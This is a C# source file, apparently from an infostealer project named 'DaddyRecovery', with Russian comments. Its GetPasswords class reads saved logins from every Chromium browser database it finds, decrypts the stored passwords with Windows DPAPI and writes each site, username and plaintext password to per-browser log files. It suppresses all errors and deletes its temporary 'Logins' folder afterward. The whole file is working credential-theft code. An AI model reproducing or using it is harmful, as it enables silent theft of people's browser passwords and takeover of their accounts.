namespace DaddyRecovery.Browsers.Chromium
{
    using System;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using DaddyRecovery.Helpers;

    public static class GetPasswords
    {
        private const string COMMANDTEXT = "SELECT origin_url, username_value, password_value FROM logins";

        private static byte[] GetBytes(SQLiteDataReader reader, int ordinal)
        {
            byte[] result = null;

            if (!reader.IsDBNull(ordinal))
            {
                long bytesRead, size = reader.GetBytes(ordinal, 0, null, 0, 0); result = new byte[size];
                int curPos = 0, bufferSize = size > int.MaxValue ? int.MaxValue : (int)size; bytesRead = 0;

                while (bytesRead < size) { bytesRead += reader.GetBytes(ordinal, curPos, result, curPos, bufferSize); curPos += bufferSize; }
            }
            return result;
        }

        /// <summary>
        /// Метод который записывает все пароли из всех БД в разные файлы 
        /// </summary>
        public static void Inizialize_Multi_file()
        {
            foreach (string v in Searcher.Database)
            {
                string BrowserName = CombineEx.GetFileNameWithoutExtension(v);
                string save = CombineEx.CombinePath(GlobalPath.Logs, $"{BrowserName}.txt");

                try
                {
                    using (var Connect = new SQLiteConnection($"Data Source={v};Version=3;New=False;Compress=True;"))
                    {
                        Connect.Open();
                        using (var ComText = new SQLiteCommand(COMMANDTEXT, Connect))
                        using (SQLiteDataReader reader = ComText.ExecuteReader())
                        {
                            if (!reader.HasRows) { continue; }
                            else { SaveLogs(BrowserName, save, reader); }
                        }
                        SQLiteConnection.ClearPool(Connect);
                    }
                }
                catch { continue; }
            }
            CombineEx.CreateOrDeleteDirectoryEx(false, CombineEx.CombinePath(GlobalPath.HomePath, "Logins"));
        }

        private static void SaveLogs(string BrowserName, string save, SQLiteDataReader reader)
        {
            try
            {
                using (var SwLog = new StreamWriter(save))
                {
                    while (reader.Read())
                    {
                        SwLog.WriteLine($"Имя браузера: {BrowserName}");
                        SwLog.WriteLine($"Ссылка: {reader[0]?.ToString()}");
                        SwLog.WriteLine($"Логин: {reader[1]?.ToString()}");
                        SwLog.WriteLine($"Пароль: {DecryptTools.DecryptValue(GetBytes(reader, 2), DataProtectionScope.LocalMachine, null)}");
                        SwLog.WriteLine();
                        SwLog.Flush();
                    }
                }
            }
            catch { }
        }
    }
}